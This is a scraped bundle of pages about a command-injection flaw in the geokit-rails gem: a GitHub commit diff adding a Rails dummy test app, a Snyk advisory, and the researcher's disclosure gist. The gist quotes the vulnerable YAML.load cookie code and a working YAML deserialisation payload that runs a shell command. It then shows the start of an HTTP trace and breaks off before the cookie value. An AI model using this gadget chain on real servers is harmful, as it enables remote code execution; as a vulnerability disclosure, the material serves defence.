| --- | --- | --- |
|  |  | @@ -0,0 +1,4 @@ |
|  |  | class ApplicationMailer < ActionMailer::Base |
|  |  | default from: "from@example.com" |
|  |  | layout "mailer" |
|  |  | end |

3 changes: 3 additions & 0 deletions

3
[test/dummy/app/models/application\_record.rb](#diff-7890cc786792b15d979ff34c6ed4e71234c89675c6a5c6115e85538235b98bd1 "test/dummy/app/models/application_record.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/models/application_record.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,3 @@ |
|  |  | class ApplicationRecord < ActiveRecord::Base |
|  |  | primary\_abstract\_class |
|  |  | end |

Empty file added
0

[test/dummy/app/models/concerns/.keep](#diff-ec9a6383dfe6878d5ccbdd2e523cf7b26fface2720ce93e1e149af93303a8ced "test/dummy/app/models/concerns/.keep")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/models/concerns/.keep)
Edit file

Delete file

Empty file.

15 changes: 15 additions & 0 deletions

15
[test/dummy/app/views/layouts/application.html.erb](#diff-43c0412d37f1d3c86ead260125fae5c3c25333954d806e7482770f1bca33f25d "test/dummy/app/views/layouts/application.html.erb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/views/layouts/application.html.erb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,15 @@ |
|  |  | <!DOCTYPE html> |
|  |  | <html> |
|  |  | <head> |
|  |  | <title>Dummy</title> |
|  |  | <meta name="viewport" content="width=device-width,initial-scale=1"> |
|  |  | <%= csrf\_meta\_tags %> |
|  |  | <%= csp\_meta\_tag %> |
|  |  |  |
|  |  | <%= stylesheet\_link\_tag "application" %> |
|  |  | </head> |
|  |  |  |
|  |  | <body> |
|  |  | <%= yield %> |
|  |  | </body> |
|  |  | </html> |

13 changes: 13 additions & 0 deletions

13
[test/dummy/app/views/layouts/mailer.html.erb](#diff-eb79f7a4d3cda0e36c31bad5bf16e4456d261a7a886e0fa4936efa5907e6b9ef "test/dummy/app/views/layouts/mailer.html.erb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/views/layouts/mailer.html.erb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,13 @@ |
|  |  | <!DOCTYPE html> |
|  |  | <html> |
|  |  | <head> |
|  |  | <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> |
|  |  | <style> |
|  |  | /\* Email styles need to be inline \*/ |
|  |  | </style> |
|  |  | </head> |
|  |  |  |
|  |  | <body> |
|  |  | <%= yield %> |
|  |  | </body> |
|  |  | </html> |

1 change: 1 addition & 0 deletions

1
[test/dummy/app/views/layouts/mailer.text.erb](#diff-04fe2214d82a5cb12a3019bba07fe279e051fc2b9ead94d1b8caf20b064da04b "test/dummy/app/views/layouts/mailer.text.erb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/app/views/layouts/mailer.text.erb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1 @@ |
|  |  | <%= yield %> |

4 changes: 4 additions & 0 deletions

4
[test/dummy/bin/rails](#diff-80ac434eb26d2b3134a5aa70f01e1338ff2cb76f42a48b4518dc21119fc29c09 "test/dummy/bin/rails")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/bin/rails)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,4 @@ |
|  |  | #!/usr/bin/env ruby |
|  |  | APP\_PATH = File.expand\_path("../config/application", \_\_dir\_\_) |
|  |  | require\_relative "../config/boot" |
|  |  | require "rails/commands" |

4 changes: 4 additions & 0 deletions

4
[test/dummy/bin/rake](#diff-44ff725e1f2a61b1e4a751068df99d4f8e153ce889fc1c4019abb19e5f711957 "test/dummy/bin/rake")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/bin/rake)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,4 @@ |
|  |  | #!/usr/bin/env ruby |
|  |  | require\_relative "../config/boot" |
|  |  | require "rake" |
|  |  | Rake.application.run |

33 changes: 33 additions & 0 deletions

33
[test/dummy/bin/setup](#diff-bac6ab11cc6857b4927928d98bb3747494759ab822510ff814f870a679225854 "test/dummy/bin/setup")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/bin/setup)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,33 @@ |
|  |  | #!/usr/bin/env ruby |
|  |  | require "fileutils" |
|  |  |  |
|  |  | # path to your application root. |
|  |  | APP\_ROOT = File.expand\_path("..", \_\_dir\_\_) |
|  |  |  |
|  |  | def system!(\*args) |
|  |  | system(\*args) || abort("\n== Command #{args} failed ==") |
|  |  | end |
|  |  |  |
|  |  | FileUtils.chdir APP\_ROOT do |
|  |  | # This script is a way to set up or update your development environment automatically. |
|  |  | # This script is idempotent, so that you can run it at any time and get an expectable outcome. |
|  |  | # Add necessary setup steps to this file. |
|  |  |  |
|  |  | puts "== Installing dependencies ==" |
|  |  | system! "gem install bundler --conservative" |
|  |  | system("bundle check") || system!("bundle install") |
|  |  |  |
|  |  | # puts "\n== Copying sample files ==" |
|  |  | # unless File.exist?("config/database.yml") |
|  |  | # FileUtils.cp "config/database.yml.sample", "config/database.yml" |
|  |  | # end |
|  |  |  |
|  |  | puts "\n== Preparing database ==" |
|  |  | system! "bin/rails db:prepare" |
|  |  |  |
|  |  | puts "\n== Removing old logs and tempfiles ==" |
|  |  | system! "bin/rails log:clear tmp:clear" |
|  |  |  |
|  |  | puts "\n== Restarting application server ==" |
|  |  | system! "bin/rails restart" |
|  |  | end |

6 changes: 6 additions & 0 deletions

6
[test/dummy/config.ru](#diff-e772adc09d3e7104e6c138f735d09b4bc15bdae53054273a84ef97c4dbde984b "test/dummy/config.ru")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config.ru)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | # This file is used by Rack-based servers to start the application. |
|  |  |  |
|  |  | require\_relative "config/environment" |
|  |  |  |
|  |  | run Rails.application |
|  |  | Rails.application.load\_server |

22 changes: 22 additions & 0 deletions

22
[test/dummy/config/application.rb](#diff-205386a3cd43d6fbf2785ab0acf2293d8f79622baf8b3230e98146135bf49f1b "test/dummy/config/application.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/application.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,22 @@ |
|  |  | require\_relative "boot" |
|  |  |  |
|  |  | require "rails/all" |
|  |  |  |
|  |  | # Require the gems listed in Gemfile, including any gems |
|  |  | # you've limited to :test, :development, or :production. |
|  |  | Bundler.require(\*Rails.groups) |
|  |  | require "geokit-rails" |
|  |  |  |
|  |  | module Dummy |
|  |  | class Application < Rails::Application |
|  |  | config.load\_defaults Rails::VERSION::STRING.to\_f |
|  |  |  |
|  |  | # Configuration for the application, engines, and railties goes here. |
|  |  | # |
|  |  | # These settings can be overridden in specific environments using the files |
|  |  | # in config/environments, which are processed later. |
|  |  | # |
|  |  | # config.time\_zone = "Central Time (US & Canada)" |
|  |  | # config.eager\_load\_paths << Rails.root.join("extras") |
|  |  | end |
|  |  | end |

5 changes: 5 additions & 0 deletions

5
[test/dummy/config/boot.rb](#diff-93fa4ea71f3809aea9caac25971a8fa5c124817100c98b996ccf2fb3eaf9e0c3 "test/dummy/config/boot.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/boot.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,5 @@ |
|  |  | # Set up gems listed in the Gemfile. |
|  |  | ENV["BUNDLE\_GEMFILE"] ||= File.expand\_path("../../../Gemfile", \_\_dir\_\_) |
|  |  |  |
|  |  | require "bundler/setup" if File.exist?(ENV["BUNDLE\_GEMFILE"]) |
|  |  | $LOAD\_PATH.unshift File.expand\_path("../../../lib", \_\_dir\_\_) |

10 changes: 10 additions & 0 deletions

10
[test/dummy/config/cable.yml](#diff-777ad19f5e0e5a9b3e939c319a47dc0cfe6d42a5bc4177aaf450db1840d651f8 "test/dummy/config/cable.yml")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/cable.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,10 @@ |
|  |  | development: |
|  |  | adapter: async |
|  |  |  |
|  |  | test: |
|  |  | adapter: test |
|  |  |  |
|  |  | production: |
|  |  | adapter: redis |
|  |  | url: <%= ENV.fetch("REDIS\_URL") { "redis://localhost:6379/1" } %> |
|  |  | channel\_prefix: dummy\_production |

25 changes: 25 additions & 0 deletions

25
[test/dummy/config/database.yml](#diff-b1513ec38b9632b1e0ef23507fda6b20822c2b7d89198090b2ece290ebc4bbb2 "test/dummy/config/database.yml")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/database.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,25 @@ |
|  |  | # SQLite. Versions 3.8.0 and up are supported. |
|  |  | # gem install sqlite3 |
|  |  | # |
|  |  | # Ensure the SQLite 3 gem is defined in your Gemfile |
|  |  | # gem "sqlite3" |
|  |  | # |
|  |  | default: &default |
|  |  | adapter: sqlite3 |
|  |  | pool: <%= ENV.fetch("RAILS\_MAX\_THREADS") { 5 } %> |
|  |  | timeout: 5000 |
|  |  |  |
|  |  | development: |
|  |  | <<: \*default |
|  |  | database: db/development.sqlite3 |
|  |  |  |
|  |  | # Warning: The database defined as "test" will be erased and |
|  |  | # re-generated from your development database when you run "rake". |
|  |  | # Do not set this db to the same as development or production. |
|  |  | test: |
|  |  | <<: \*default |
|  |  | database: db/test.sqlite3 |
|  |  |  |
|  |  | production: |
|  |  | <<: \*default |
|  |  | database: db/production.sqlite3 |

5 changes: 5 additions & 0 deletions

5
[test/dummy/config/environment.rb](#diff-944d9c0a8ec37728892a31c68561f49da72c6977976df5b9895810354ab87c37 "test/dummy/config/environment.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/environment.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,5 @@ |
|  |  | # Load the Rails application. |
|  |  | require\_relative "application" |
|  |  |  |
|  |  | # Initialize the Rails application. |
|  |  | Rails.application.initialize! |

68 changes: 68 additions & 0 deletions

68
[test/dummy/config/environments/development.rb](#diff-8381d73e0802ca81482465d944159bee7fedeeb2512a774b3a05174828166a0f "test/dummy/config/environments/development.rb")

Show comments

[View file](/geokit/geokit-rails/blob/7ffc5813e57f6f417987043e1039925fd0865c43/test/dummy/config/environments/development.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,68 @@ |
|  |  | require "active\_support/core\_ext/integer/time" |
|  |  |  |
|  |  | Rails.application.configure do |
|  |  | # Settings specified here will take precedence over those in config/application.rb. |
|  |  |  |
|  |  | # In the development environment your application's code is reloaded any time |
|  |  | # it changes. This slows down response time but is perfect for development |
|  |  | # since you don't have to restart the web server when you make code changes. |
|  |  | config.cache\_classes = false |
|  |  |  |
|  |  | # Do not eager load code on boot. |
|  |  | config.eager\_load = false |
|  |  |  |
|  |  | # Show full error reports. |
|  |  | config.consider\_all\_requests\_local = true |
|  |  |  |
|  |  | # Enable server timing |
|  |  | config.server\_timing = true |
|  |  |  |
|  |  | # Enable/disable caching. By default caching is disabled. |
|  |  | # Run rails dev:cache to toggle caching. |
|  |  | if Rails.root.join("tmp/caching-dev.txt").exist? |
|  |  | config.action\_controller.perform\_caching = true |
|  |  | config.action\_controller.enable\_fragment\_cache\_logging = true |
|  |  |  |
|  |  | config.cache\_store = :memory\_store |
|  |  | config.public\_file\_server.headers = { |
|  |  | "Cache-Control" => "public, max-age=#{2.days.to\_i}" |
|  |  | } |
|  |  | else |
|  |  | config.action\_controller.perform\_caching = false |
|  |  |  |
|  |  | config.cache\_store = :null\_store |
|  |  | end |
|  |  |  |
|  |  | # Store uploaded files on the local file system (see config/storage.yml for options). |
|  |  | config.active\_storage.service = :local |
|  |  |  |
|  |  | # Don't care if the mailer can't send. |
|  |  | config.action\_mailer.raise\_delivery\_errors = false |
|  |  |  |
|  |  | config.action\_mailer.perform\_caching = false |
|  |  |  |
|  |  | # Print deprecation notices to the Rails logger. |
|  |  | config.active\_support.deprecation = :log |
|  |  |  |
|  |  | # Raise exceptions for disallowed deprecations. |
|  |  | config.active\_support.disallowed\_deprecation = :raise |
|  |  |  |
|  |  | # Tell Active Support which deprecation messages to disallow. |
|  |  | config.active\_support.disallowed\_deprecation\_warnings = [] |
|  |  |  |
|  |  | # Raise an error on page load if there are pending migrations. |
|  |  | config.active\_record.migration\_error = :page\_load |
|  |  |  |
|  |  | # Highlight code that triggered database queries in logs. |
|  |  | config.active\_record.verbose\_query\_logs = true |
|  |  |  |
|  |  |  |
|  |  | # Raises error for missing translations. |
|  |  | # config.i18n.raise\_on\_missing\_translations = true |
|  |  |  |
|  |  | # Annotate rendered view with file names. |
|  |  | # config.action\_view.annotate\_rendered\_view\_with\_filenames = true |
|  |  |  |
|  |  | # Uncomment if you wish to allow Action Cable access from any origin. |
|  |  | # config.action\_cable.disable\_request\_forgery\_protection = true |
|  |  | end |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `7ffc581`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2F7ffc5813e57f6f417987043e1039925fd0865c43) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.snyk.io_ea55c27f_20250111_155818.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [RubyGems](/vuln/rubygems)
4. geokit-rails
# Command Injection Affecting [geokit-rails](/package/rubygems/geokit-rails) package, versions **<2.5.0**

---

### Severity

 Recommended 0.0high010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-RUBY-GEOKITRAILS-5920323#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**0.67% (80th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)
### Snyk Learn

Learn about Command Injection vulnerabilities in an interactive lesson.

 [Start learning](https://learn.snyk.io/lesson/malicious-code-injection/)

* Snyk ID**SNYK-RUBY-GEOKITRAILS-5920323**
* published**5 Oct 2023**
* disclosed**26 Sept 2023**
* credit**Calum Hutton**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 26 Sep 2023

[CVE-2023-26153  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26153) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-78  (opens in a new tab)](https://cwe.mitre.org/data/definitions/78.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `geokit-rails` to version 2.5.0 or higher.

## Overview

Affected versions of this package are vulnerable to Command Injection due to unsafe deserialisation of YAML within the 'geo\_location' cookie. This issue can be exploited remotely via a malicious cookie value.

**Note:**

An attacker can use this vulnerability to execute commands on the host system.

## References

* [GitHub Commit](https://github.com/geokit/geokit-rails/commit/7ffc5813e57f6f417987043e1039925fd0865c43)
* [GitHub Commit](https://github.com/geokit/geokit-rails/commit/a93dfe49fb9aeae7164e2f8c4041450a04b5482f)
* [GitHub Gist](https://gist.github.com/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d)
* [Vulnerable Code](https://github.com/geokit/geokit-rails/blob/master/lib/geokit-rails/ip_geocode_lookup.rb#L37)
### CVSS Scores

version 3.1
### Snyk

8.3 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.

  **Changed**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**
### NVD

9.8 critical
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.



=== Content from gist.github.com_da48e92d_20250111_155815.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@CalumHutton](https://avatars.githubusercontent.com/u/89394440?s=64&v=4)](/CalumHutton)

# [CalumHutton](/CalumHutton)/**[geokit-rails.md](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d)** Secret

Created
September 15, 2023 16:56

Show Gist options

* [Download ZIP](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d/archive/f36119a0e04ca50a4fb7fb0bf4c5766f97abdb08.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d.js&quot;&gt;&lt;/script&gt;
* Save CalumHutton/b7aa1c2e71c8d4386463ac14f686901d to your computer and use it in GitHub Desktop.

[Code](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d)
[Revisions
1](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d.js&quot;&gt;&lt;/script&gt;

Save CalumHutton/b7aa1c2e71c8d4386463ac14f686901d to your computer and use it in GitHub Desktop.

[Download ZIP](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d/archive/f36119a0e04ca50a4fb7fb0bf4c5766f97abdb08.zip)

geokit-rails v2.3.2 Unsafe Deserialisation

 [Raw](/CalumHutton/b7aa1c2e71c8d4386463ac14f686901d/raw/f36119a0e04ca50a4fb7fb0bf4c5766f97abdb08/geokit-rails.md)

[**geokit-rails.md**](#file-geokit-rails-md)

## geokit-rails v2.3.2 Unsafe Deserialisation

### Disclosure Status

I have already disclosed this to the maintainer, who issued a fix in version 2.5.0 (<https://rubygems.org/gems/geokit-rails/versions/2.5.0>). I'd like to request a CVE be assigned for this vulnerability.

### Technical Details:

I have identified that geokit-rails version 2.3.2 is vulnerable to command injection due to unsafe deserialisation of YAML within the 'geo\_location' cookie. The code within the library that triggers unsafe YAML deserialisation can be found in the IpGeocodeLookup module (<https://github.com/geokit/geokit-rails/blob/master/lib/geokit-rails/ip_geocode_lookup.rb#L37>)

```
# Uses the stored location value from the cookie if it exists.  If
# no cookie exists, calls out to the web service to get the location.
def retrieve_location_from_cookie_or_service
  return GeoLoc.new(YAML.load(cookies[:geo_location])) if cookies[:geo_location]
  location = Geocoders::MultiGeocoder.geocode(get_ip_address)
  return location.success ? location : nil
end
```

This issue can be exploited remotely via a malicious cookie value, which likely increases the potential impact and severity of the issue.

### Proof Of Concept/Steps to Reproduce:

The YAML payload used will execute the command 'id' upon deserialisation:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

The HTTP trace below illustrates the URL-encoded payload used in the `geo_location` cookie of a GET request to trigger this issue:

```
GET http://127.0.0.1:3000/vulns HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 0
